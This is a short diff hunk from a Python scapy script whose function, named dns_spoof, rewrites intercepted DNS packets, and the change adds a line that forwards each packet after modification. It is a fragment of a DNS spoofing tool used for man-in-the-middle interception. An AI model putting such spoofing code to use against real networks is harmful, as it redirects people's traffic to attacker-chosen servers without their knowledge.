@@ -20,6 +20,9 @@ def dns_spoof(packet, domain_to_spoof, server_ip):
             del scapy_packet[scapy.UDP].chksum
 
             packet.set_payload(str(scapy_packet))
+            
+    packet.accept()            
+      
 
 
 
